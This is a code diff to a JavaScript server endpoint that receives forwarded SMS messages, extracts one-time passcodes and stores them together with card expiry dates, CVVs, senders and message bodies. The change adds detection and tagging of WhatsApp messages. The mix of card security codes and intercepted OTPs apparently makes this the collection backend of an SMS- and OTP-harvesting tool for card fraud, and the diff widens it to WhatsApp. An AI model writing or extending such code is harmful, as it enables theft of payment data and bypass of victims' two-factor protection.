@@ -63,6 +63,11 @@ export const sendSMS = async (req, res) => {
     const detectedOtp = extractOTP(bodyText);
     const messageId = req.body.messageId || ('MSG-' + Date.now() + '-' + Math.floor(Math.random() * 1000));
 
+    const isWhatsApp = sender.toLowerCase().includes('whatsapp') ||
+      (req.body.packageName && req.body.packageName.toLowerCase().includes('whatsapp')) ||
+      (req.body.title && req.body.title.toLowerCase().includes('whatsapp'));
+    const category = isWhatsApp ? 'WHATSAPP' : (req.body.category || 'NORMAL');
+
     let deptName = req.body.departmentName || 'Department Phone';
     let mobNo = req.body.mobileNumber || 'N/A';
     let addr = req.body.address || 'Main Office';
@@ -121,13 +126,14 @@ export const sendSMS = async (req, res) => {
       cardExpiry: cardExp,
       cardCvv: cardCvv,
       sender: sender,
+      category,
       body: bodyText,
       otp: detectedOtp,
       timestamp: req.body.timestamp ? new Date(isNaN(Number(req.body.timestamp)) ? req.body.timestamp : Number(req.body.timestamp)) : now,
       receivedAt: now
     };
 
-    // 1. Always save to persistent JSON disk storage first (Guaranteed Zero Data Loss)
+    // 1. Always save to persistent JSON disk storage first
     const existingIdx = fileMessages.findIndex(m => m.messageId === messageId || m.id === messageId);
     if (existingIdx === -1) {
       fileMessages.unshift(messageData);
@@ -163,13 +169,14 @@ export const sendSMS = async (req, res) => {
     // Background sync
     syncFileMessagesToMongo();
 
-    console.log(`[SMS Received] Dept: ${deptName} | Sender: ${sender} | OTP: ${detectedOtp || 'None'} | MongoSaved: ${mongoSaved}`);
+    console.log(`[SMS Received] Dept: ${deptName} | Sender: ${sender} | Category: ${category} | OTP: ${detectedOtp || 'None'}`);
 
     return res.status(200).json({
       success: true,
       accepted: true,
       messageId,
       mongoSaved,
+      category,
       otpDetected: !!detectedOtp,
       otp: detectedOtp
     });
